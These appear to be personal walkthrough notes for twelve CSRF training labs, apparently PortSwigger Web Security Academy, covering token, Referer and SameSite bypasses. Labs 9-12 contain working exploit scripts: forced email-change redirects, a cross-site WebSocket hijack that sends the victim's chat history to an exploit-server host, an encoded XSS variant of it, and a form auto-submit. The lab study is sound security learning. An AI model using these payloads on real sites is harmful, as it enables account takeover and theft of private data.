# Csrf - Walkthroughs

```mermaid
graph TD
    Root["Csrf"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
    Root --> L5["Lab 06"]
    click L5 href "#lab-06"
    Root --> L6["Lab 07"]
    click L6 href "#lab-07"
    Root --> L7["Lab 08"]
    click L7 href "#lab-08"
    Root --> L8["Lab 09"]
    click L8 href "#lab-09"
    Root --> L9["Lab 10"]
    click L9 href "#lab-10"
    Root --> L10["Lab 11"]
    click L10 href "#lab-11"
    Root --> L11["Lab 12"]
    click L11 href "#lab-12"
```

## Lab 01: CSRF vulnerability with no defenses
<a id="lab-01"></a>

## Vulnerability
email change functionality

## Goal
exploit the CSRF vulnerability and change the email address

## Credentials
`wiener:peter`

## Analysis

In order for a CSRF attack to be possible:
- A relevant action - email change functionality
- Cookie based session handling - session cookie
- No unpredictable request parameters - satisfied



---

## Lab 02: CSRF where token validation depends on request method
<a id="lab-02"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: Request method can be changed to GET which does not require CSRF token

Testing CSRF Tokens:
1. Change the request method from POST to GET


---

## Lab 03: CSRF where token validation depends on token being present
<a id="lab-03"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token is not mandatory

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET


---

## Lab 04: CSRF where token is not tied to user session
<a id="lab-04"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Credentials - wiener:peter, carlos:montoya

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: csrf token is not tied to user session

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

---

## Lab 05: CSRF where token is tied to non-session cookie
<a id="lab-05"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter, carlos:montoya

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 


Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user

csrf token: SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb
csrfKey cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token





---

## Lab 06: CSRF where token is duplicated in cookie
<a id="lab-06"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 

Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user


In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrf cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token

---

## Lab 07: CSRF where Referer validation depends on header being present
<a id="lab-07"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters: no csrf token

Testing Referer header for CSRF attacks:
1. Remove the Referer header

---

## Lab 08: CSRF where token is duplicated in cookie
<a id="lab-08"></a>

## Vulnerability
email change functionality

## Goal
exploit CSRF to change email address

Creds - wiener:peter

## Analysis

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters (satisfied b/c no csrf token)

Testing Referer header for CSRF attacks:
1. Remove the Referer header
2. Check which portion of the referrer header is the application validating

---

## Lab 09: SameSite Lax bypass via method override
<a id="lab-09"></a>

## Goal
Exploit CSRF to change the victim's email address.

Creds - wiener:peter

## Analysis

<script>
    document.location = "https://0a1200a103990ed481024882008600cc.web-security-academy.net/my-account/change-email?email=test2%40test.ca&_method=POST";
</script>

---

## Lab 10: SameSite Strict bypass via client-side redirect
<a id="lab-10"></a>

## Goal
Exploit CSRF to change the victim's email address.

Creds - wiener:peter

## Analysis

<script>
   document.location="https://0aaf00af03e122ac81887f1000cf00ba.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=test2%40test.ca%26submit=1";
</script>

---

## Lab 11: SameSite Strict bypass via sibling domain
<a id="lab-11"></a>

## Goal
Perform a cross-site websocket hijacking attack to exfiltrate the victim's chat history and compromise the victim's account.

## Analysis

Cross-Site Websocket Hijacking Attack:
--------------------------------------
<script>
    var ws = new WebSocket('wss://0aa8004b03ea6683810111d900540004.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0afe00f703036646819010e501280044.exploit-server.net/exploit?content=' + event.data)
    }
</script>


Cross-Site Websocket Hijacking Attack + XSS:
--------------------------------------------
<script>
document.location = "https://cms-0aa8004b03ea6683810111d900540004.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%38%30%30%34%62%30%33%65%61%36%36%38%33%38%31%30%31%31%31%64%39%30%30%35%34%30%30%30%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%66%65%30%30%66%37%30%33%30%33%36%36%34%36%38%31%39%30%31%30%65%35%30%31%32%38%30%30%34%34%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%63%6f%6e%74%65%6e%74%3d%27%20%2b%20%65%76%65%6e%74%2e%64%61%74%61%29%0a%20%20%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=fwefwefw";
</script>

---

## Lab 12: SameSite Lax bypass via cookie refresh
<a id="lab-12"></a>

## Goal
Exploit CSRF to change the victim's email address

Creds - wiener:peter

## Analysis

<form action="https://0a92009603dec172800c172d00cb00ee.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="test4@test.ca"/>
</form>
<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://0a92009603dec172800c172d00cb00ee.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }
    function changeEmail(){
        document.forms[0].submit();
    }
</script>

---

